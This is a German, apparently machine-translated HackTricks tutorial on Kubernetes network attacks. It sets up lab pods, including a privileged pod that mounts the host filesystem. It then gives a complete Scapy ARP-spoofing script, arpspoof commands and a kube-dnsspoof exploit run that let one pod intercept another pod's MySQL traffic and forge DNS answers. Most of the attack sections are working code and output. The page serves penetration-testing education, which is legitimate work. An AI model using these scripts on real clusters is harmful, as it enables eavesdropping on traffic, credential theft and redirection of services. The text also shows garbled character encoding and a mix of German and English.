# Kubernetes-Netzwerkangriffe

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Einf√ºhrung

In Kubernetes wird beobachtet, dass ein Standardverhalten die Herstellung von Verbindungen zwischen **allen Containern, die sich auf demselben Knoten befinden**, erlaubt. Dies gilt unabh√§ngig von den Namensraumunterschieden. Diese Konnektivit√§t erstreckt sich bis zu **Layer 2** (Ethernet). Folglich k√∂nnte diese Konfiguration das System potenziell Schwachstellen aussetzen. Insbesondere er√∂ffnet sie die M√∂glichkeit, dass ein **b√∂sartiger Container** einen **ARP-Spoofing-Angriff** gegen andere Container, die sich auf demselben Knoten befinden, ausf√ºhrt. W√§hrend eines solchen Angriffs kann der b√∂sartige Container betr√ºgerisch den Netzwerkverkehr abfangen oder √§ndern, der f√ºr andere Container bestimmt ist.

ARP-Spoofing-Angriffe beinhalten, dass der **Angreifer gef√§lschte ARP** (Address Resolution Protocol) Nachrichten √ºber ein lokales Netzwerk sendet. Dies f√ºhrt dazu, dass die **MAC-Adresse des Angreifers mit der IP-Adresse eines legitimen Computers oder Servers im Netzwerk verkn√ºpft wird**. Nach erfolgreicher Ausf√ºhrung eines solchen Angriffs kann der Angreifer Daten im Transit abfangen, √§ndern oder sogar stoppen. Der Angriff wird auf Layer 2 des OSI-Modells ausgef√ºhrt, weshalb die standardm√§√üige Konnektivit√§t in Kubernetes auf dieser Ebene Sicherheitsbedenken aufwirft.

In dem Szenario werden 4 Maschinen erstellt:

* ubuntu-pe: Privilegierte Maschine, um zum Knoten zu entkommen und Metriken zu √ºberpr√ºfen (nicht f√ºr den Angriff ben√∂tigt)
* **ubuntu-attack**: **B√∂sartiger** Container im Standard-Namensraum
* **ubuntu-victim**: **Opfer** Maschine im kube-system Namensraum
* **mysql**: **Opfer** Maschine im Standard-Namensraum
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Grundlegende Kubernetes-Netzwerk

Wenn Sie mehr Details zu den hier eingef√ºhrten Netzwerkthemen w√ºnschen, gehen Sie zu den Referenzen.

### ARP

Allgemein gesagt, ist **Pod-zu-Pod-Netzwerk innerhalb des Knotens** √ºber eine **Br√ºcke** verf√ºgbar, die alle Pods verbindet. Diese Br√ºcke wird ‚Äû**cbr0**‚Äú genannt. (Einige Netzwerk-Plugins installieren ihre eigene Br√ºcke.) Die **cbr0 kann auch ARP** (Address Resolution Protocol) Aufl√∂sung durchf√ºhren. Wenn ein eingehendes Paket bei cbr0 ankommt, kann es die Ziel-MAC-Adresse mit ARP aufl√∂sen.

Diese Tatsache impliziert, dass standardm√§√üig **jeder Pod, der im selben Knoten l√§uft**, in der Lage sein wird, mit jedem anderen Pod im selben Knoten (unabh√§ngig vom Namespace) auf Ethernet-Ebene (Schicht 2) zu **kommunizieren**.

{% hint style="warning" %}
Daher ist es m√∂glich, A**RP-Spoofing-Angriffe zwischen Pods im selben Knoten durchzuf√ºhren.**
{% endhint %}

### DNS

In Kubernetes-Umgebungen finden Sie normalerweise 1 (oder mehr) **DNS-Dienste, die** normalerweise im kube-system-Namespace ausgef√ºhrt werden:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
In den vorherigen Informationen k√∂nnen Sie etwas Interessantes sehen, die **IP des Dienstes** ist **10.96.0.10**, aber die **IP des Pods**, der den Dienst ausf√ºhrt, ist **172.17.0.2.**

Wenn Sie die DNS-Adresse innerhalb eines Pods √ºberpr√ºfen, werden Sie etwas wie folgt finden:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
However, the pod **wei√ü nicht**, wie es zu dieser **Adresse** gelangt, da der **Pod-Bereich** in diesem Fall 172.17.0.10/26 ist.

Therefore, the pod will send the **DNS requests to the address 10.96.0.10**, which will be **√ºbersetzt** von cbr0 **zu** **172.17.0.2**.

{% hint style="warning" %}
This means that a **DNS request** of a pod is **immer** going to go the **bridge** to **√ºbersetzen** die **Service-IP zur Endpunkt-IP**, selbst wenn der DNS-Server im selben Subnetz wie der Pod ist.

Knowing this, and knowing **ARP-Angriffe sind m√∂glich**, wird ein **Pod** in einem Knoten in der Lage sein, den **Verkehr** zwischen **jedem Pod** im **Subnetz** und der **Bridge** zu **√ºberwachen** und die **DNS-Antworten** vom DNS-Server (**DNS Spoofing**) zu **modifizieren**.

Moreover, if the **DNS-Server** im **gleichen Knoten wie der Angreifer** ist, kann der Angreifer **alle DNS-Anfragen** eines Pods im Cluster (zwischen dem DNS-Server und der Bridge) abfangen und die Antworten modifizieren.
{% endhint %}

## ARP Spoofing in Pods im selben Knoten

Unser Ziel ist es, **mindestens die Kommunikation vom ubuntu-victim zur mysql** zu **stehlen**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Wie bereits erw√§hnt, wenn Sie **ein Pod im selben Knoten des DNS-Server-Pods kompromittieren**, k√∂nnen Sie **MitM** mit **ARPSpoofing** die **Bridge und das DNS**-Pod **√ºberlisten** und **alle DNS-Antworten √§ndern**.

Sie haben ein wirklich sch√∂nes **Tool** und **Tutorial**, um dies zu testen unter [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

In unserem Szenario, **laden Sie** das **Tool** im Angreifer-Pod herunter und erstellen Sie eine \*\*Datei mit dem Namen `hosts` \*\* mit den **Domains**, die Sie **spoofen** m√∂chten, wie:
```
cat hosts
google.com. 1.1.1.1
```
F√ºhren Sie den Angriff auf die ubuntu-victim-Maschine aus:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
Wenn Sie versuchen, Ihr eigenes DNS-Spoofing-Skript zu erstellen, wird es **nicht funktionieren**, wenn Sie **nur die DNS-Antwort √§ndern**, da die **Antwort** eine **src IP** die IP-Adresse des **b√∂sartigen** **Pods** haben wird und **nicht** **akzeptiert** wird.\
Sie m√ºssen ein **neues DNS-Paket** mit der **src IP** des **DNS** generieren, an den der Opfer die DNS-Anfrage sendet (was etwa 172.16.0.2 entspricht, nicht 10.96.0.10, das ist die K8s DNS-Service-IP und nicht die DNS-Server-IP, mehr dazu in der Einleitung).
{% endhint %}

## Verkehr erfassen

Das Tool [**Mizu**](https://github.com/up9inc/mizu) ist ein einfaches, aber leistungsstarkes API **Verkehrsbetrachter f√ºr Kubernetes**, das es Ihnen erm√∂glicht, **alle API-Kommunikationen** zwischen Mikrodiensten zu **sehen**, um Ihnen beim Debuggen und Beheben von Regressionen zu helfen.\
Es wird Agenten in den ausgew√§hlten Pods installieren und deren Verkehrsinfos sammeln und Ihnen auf einem Webserver anzeigen. Sie ben√∂tigen jedoch hohe K8s-Berechtigungen daf√ºr (und es ist nicht sehr heimlich).

## Referenzen

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterst√ºtzen</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
